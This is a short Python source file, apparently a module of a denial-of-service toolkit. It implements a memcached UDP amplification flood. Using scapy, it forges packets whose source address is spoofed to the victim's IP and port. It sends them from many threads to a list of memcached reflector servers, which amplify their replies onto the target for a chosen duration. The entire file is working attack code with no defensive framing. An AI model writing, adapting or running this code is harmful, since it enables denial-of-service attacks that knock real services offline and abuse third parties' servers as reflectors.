import random
import time
from scapy.all import IP, UDP, send, Raw
from threading import Thread

def MEMCACHED_ATTACK(threads, attack_time, target):
	# Finish
	global FINISH
	FINISH = False

	target_ip = target.split(":")[0]
	target_port = int(target.split(":")[1])

	print("[#] Attack started for " + str(attack_time) + " secounds..")
	
	# Payload
	payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
	threads_list = []
	# Load MEMCACHED servers list
	with open("tools/L4/memcached_servers.txt", 'r') as f:
		memcached_servers = f.readlines()

	# MEMCACHED flood
	def memcached_flood():
		global FINISH
		while not FINISH:
			for server in memcached_servers:
				if not FINISH:
					packets = random.randint(10, 150)
					server = server.replace("\n", "")
					# Packet
					try:
						packet = IP(dst = server, src = target_ip) / UDP(sport = target_port, dport = 11211) / Raw(load = payload)
						send(packet, count = packets, verbose = False)
					except Exception as e:
						print(e)
					else:
						print("[+] Sending " + str(packets) + " forged UDP packets to: " + server)

	# Start threads
	for thread in range(threads):
		print("[#] Staring thread " + str(thread))
		t = Thread(target = memcached_flood)
		t.start()
		threads_list.append(t)
	# Sleep selected secounds
	time.sleep(attack_time)
	# Terminate threads
	for thread in threads_list:
		FINISH = True
		thread.join()
	
	print("[!] MEMCACHED attack stopped!")